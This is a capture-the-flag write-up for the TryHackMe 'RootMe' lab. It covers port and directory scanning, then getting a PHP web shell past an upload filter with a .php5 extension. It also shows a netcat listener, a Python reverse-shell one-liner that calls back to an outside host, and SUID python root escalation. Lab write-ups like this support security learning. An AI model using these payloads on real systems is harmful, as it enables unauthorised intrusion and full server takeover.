# RootMe

### Recon

#### NMAP Scan
```
[ Oguri ~ ]$ nmap -sV 10.80.159.121
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-04 19:50 +0000
Nmap scan report for 10.80.159.121
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Enumeration
```
[ Oguri ~ ]$ feroxbuster -u http://10.80.159.121/  -w /home/caffra/Wordlists/dirbuster-wordlist/directory-list-2.3-big.txt 
                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.80.159.121/
 🚩  In-Scope Url          │ 10.80.159.121
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/caffra/Wordlists/dirbuster-wordlist/directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       11l       22w      263c http://10.80.159.121/js/maquina_de_escrever.js
200      GET      105l      188w     1697c http://10.80.159.121/css/home.css
301      GET        9l       28w      316c http://10.80.159.121/uploads => http://10.80.159.121/uploads/
301      GET        9l       28w      312c http://10.80.159.121/css => http://10.80.159.121/css/
200      GET      100l      161w     1611c http://10.80.159.121/css/panel.css
301      GET        9l       28w      311c http://10.80.159.121/js => http://10.80.159.121/js/
200      GET       25l       44w      616c http://10.80.159.121/
301      GET        9l       28w      314c http://10.80.159.121/panel => http://10.80.159.121/panel/
```
At http://10.80.159.121/panel i find a place to upload files 

<img width="250" height="300" alt="image" src="https://github.com/user-attachments/assets/0e49da1b-37a1-41b1-9f0a-3cdf603abe58" />

and at http://10.80.145.92/uploads/ i can see where files ends

<img width="300" height="250" alt="image" src="https://github.com/user-attachments/assets/cecb5ce4-43c1-48ad-8bfa-9fa32b5cf8e7" />

### Getting shell

I tried upload basic RCE with .php extension but site block it 
Payload i used:
```
<?php echo(system($_GET['cmd'])); ?>
```

<img width="250" height="300" alt="image" src="https://github.com/user-attachments/assets/dee235f1-29a5-4a28-84fc-2a61aee90c5f" />

But if i change .php to .php5 site aprove 

<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/4150b229-60d4-4846-9919-b5b2cb73873f" />

And like that we can see web is vulnerable to RCE

<img width="300" height="250" alt="image" src="https://github.com/user-attachments/assets/fae1f65d-950b-4af0-baed-371227bebb5d" />

Ok now its time to exploit it, at first set a netcat for listening
```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

But how to exploit it,
URL would look like that

**http://XXX/uploads/rce.php5**

and in payload we use "'cmd'" so we can use it like web like a terminal 

**http://XXX/uploads/rce.php5?cmd=ls**

and we can exploi it with other RCE writen in python

**http://XXX/uploads/rce.php5?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**

---
### First flag 

first flag is pretty easy we just need to find user.txt file we can do it like that
```
find / -type f -name user.txt 2> /dev/null
```

```
bash-5.0$ cat user.txt
cat user.txt
THM{XXX}
```

### Secound flag 

That flag is root flag 

with we can search file with SUID permissions
```
# find / -user root -perm /4000
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
```
we can see that we can use Python 2.7
i used https://gtfobins.github.io/gtfobins/python/#sudo to abuse it 
```
bash-5.0$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
cd /root
cd /root
ls
ls
root.txt  snap
cat root.txt
cat root.txt
THM{XXX}
```
